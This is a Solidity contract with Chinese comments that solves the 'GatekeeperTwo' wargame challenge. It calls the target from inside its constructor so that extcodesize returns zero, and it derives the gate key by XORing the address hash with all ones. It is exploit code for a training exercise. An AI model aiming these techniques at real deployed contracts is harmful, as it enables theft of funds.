// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperTwo {
    constructor(address _target) {
        IGatekeeperTwo target = IGatekeeperTwo(_target);

        // --- Gate 3 運算邏輯 ---
        // 1. 取得 msg.sender (也就是 address(this)) 的雜湊前 8 bytes
        bytes8 myHash = bytes8(keccak256(abi.encodePacked(address(this))));
        
        // 2. 根據 XOR 特性：A ^ B = C  =>  B = A ^ C
        // 這裡 C 是 type(uint64).max，即 0xffffffffffffffff
        // 我們把 myHash (A) 與 全 F (C) 做 XOR 得到我們的 key (B)
        uint64 keyUint = uint64(myHash) ^ type(uint64).max;
        bytes8 gateKey = bytes8(keyUint);

        // --- 發動攻擊 ---
        // 此時還在 constructor 內，target 執行 extcodesize(caller()) 會回傳 0
        target.enter(gateKey);
    }
}
